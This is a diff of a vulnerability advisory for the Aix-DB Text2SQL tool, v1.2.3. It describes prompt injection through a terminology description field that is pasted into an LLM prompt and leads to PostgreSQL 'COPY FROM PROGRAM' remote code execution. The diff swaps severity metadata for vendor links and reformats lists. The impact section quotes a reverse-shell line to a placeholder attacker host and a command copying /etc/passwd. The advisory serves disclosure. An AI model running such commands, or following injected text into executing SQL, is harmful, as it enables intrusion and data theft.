@@ -1,9 +1,7 @@
 # ISSUE-001: Text2SQL Prompt Injection Leading to Remote Code Execution (RCE)
 
-**Severity**: 🔴 **Critical**
-**CVSS Score**: 9.8 (Critical)
-**OWASP Classification**: A03:2021 - Injection
-**Discovery Date**: 2025-02-14
+**Vendor:** http://www.aixhub.top/
+**Software:** https://github.com/apconw/Aix-DB
 **Affected Version**: v1.2.3
 
 ---
@@ -86,8 +84,8 @@ Combined with PostgreSQL's `COPY FROM PROGRAM` functionality, an attacker can **
 
 ### 3.1 Prerequisites
 
-- Account with permission to add terminology
-- PostgreSQL datasource with database user having `COPY` privileges
+-   Account with permission to add terminology
+-   PostgreSQL datasource with database user having `COPY` privileges
 
 ### 3.2 Attack Steps
 
@@ -129,10 +127,10 @@ a9545bfb703a:/#
 
 ### 3.3 Attack Impact
 
-- **Arbitrary file write**: `id > /tmp/abx`
-- **Reverse shell**: `bash -i >& /dev/tcp/attacker/port 0>&1`
-- **Data exfiltration**: `cat /etc/passwd > /tmp/passwd`
-- **Lateral movement**: Further penetration of internal network via database server
+-   **Arbitrary file write**: `id > /tmp/abx`
+-   **Reverse shell**: `bash -i >& /dev/tcp/attacker/port 0>&1`
+-   **Data exfiltration**: `cat /etc/passwd > /tmp/passwd`
+-   **Lateral movement**: Further penetration of internal network via database server
 
 ---
 
@@ -150,8 +148,8 @@ The `description` field of terminology is directly concatenated into the LLM pro
 
 ```yaml
 template:
-  terminology: |
-    {terminologies}  # ← Direct concatenation, no escaping
+    terminology: |
+        {terminologies}  # ← Direct concatenation, no escaping
 ```
 
 ### 4.3 No SQL Type Checking Before Execution
